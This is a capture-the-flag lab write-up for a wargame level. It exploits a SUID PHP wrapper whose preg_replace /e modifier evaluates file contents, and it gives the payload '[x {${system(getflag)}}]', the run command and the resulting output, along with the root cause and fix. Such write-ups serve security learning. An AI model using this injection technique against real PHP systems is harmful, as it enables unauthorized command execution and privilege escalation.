# Level 06

## 1. Target Information
- **User:** `level06`
- **Password:** `***FLAG05***`
- **Target:** `flag06`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Search for files owned by `flag06`:

```bash
find / -user flag06 2>/dev/null
ls -l
file level06
```

**Findings:**
- A SUID executable owned by `flag06`, paired with a PHP script:
```text
-rwsr-x---+ 1 flag06 level06      ... level06
-rwxr-x---  1 flag06 level06      ... level06.php
```
- The `s` bit means the program runs as `flag06`. It is a PHP wrapper that executes `level06.php`:
```php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]); print $r;
```
- `argv[1]` is treated as a **file path** (`file_get_contents`), not as the payload itself. `argv[2]` is unused.

---

## 3. Vulnerability Analysis
- **Flaw Type:** PHP code injection via the `preg_replace` `/e` modifier (`eval` of attacker-controlled input).
- **Technical Explanation:**
  - The `y()` function, the `[`→`(` and `]`→`)` substitutions are distractions. The only dangerous line is:
    ```php
    preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    ```
  - The `/e` modifier makes PHP **evaluate the replacement string as PHP code** for every match — equivalent to `eval('y("\2");')`.
  - The pattern `(\[x (.*)\])` matches `[x ...]`; capture group 2 (`\2`) is the attacker-controlled text inside the brackets. It is spliced directly into the eval'd code.
  - Working backward from the sink:
    - The eval'd code is `y("\2")`, where `\2` is the backreference holding our captured text — so our text lands **inside a double-quoted PHP string literal**.
    - Double-quoted strings (unlike single-quoted ones) interpolate variable expressions, including the `${ expr }` / `{${ expr }}` construct, which forces PHP to **evaluate `expr`** to resolve a variable name. Setting `\2 = {${system(getflag)}}` means PHP evaluates `system(getflag)` as a side effect while building the string.
    - `\2` is whatever matches `(.*)`, so the file must contain `[x {${system(getflag)}}]`.
  - Because the binary is SUID `flag06`, the injected `getflag` runs **as `flag06`**.
  - **Root cause / fix:** never use the `/e` modifier (removed in PHP 7). Treat input as data, and never `eval` strings built from it.

---

## 4. Exploitation Walkthrough

### Step 1: Write the payload to a file
`argv[1]` is read with `file_get_contents`, so the payload goes in a file, not on the command line. Writing to a file also avoids the shell trying to expand `${...}` (`bad substitution`):
```bash
cat > /tmp/file <<'EOF'
[x {${system(getflag)}}]
EOF

cat /tmp/file          # verify: [x {${system(getflag)}}]
```

> **No quotes in the payload.** The `/e` modifier auto-escapes quotes and backslashes in the backreference before evaluating, so `system('getflag')` becomes `system(\'getflag\')` and throws a `T_ENCAPSED_AND_WHITESPACE` parse error. Passing `getflag` as a bare word sidesteps this: PHP treats the undefined constant as the string `"getflag"` (with a notice), so `system(getflag)` runs the command with nothing for `/e` to escape.

### Step 2: Run the SUID binary against the file
```bash
~/level06 /tmp/file
# PHP Notice:  Use of undefined constant getflag - assumed 'getflag' ...
# Check flag.Here is your token : ***FLAG06***
```

The eval'd code becomes `y("{${system(getflag)}}")`; building that string executes `system(getflag)`, which runs `getflag` as `flag06` and prints the token.

---

## 5. Flag
```text
Check flag.Here is your token : ***FLAG06***
```
- **Next Level User:** `level07`
- **Password for next level:** `***FLAG06***`
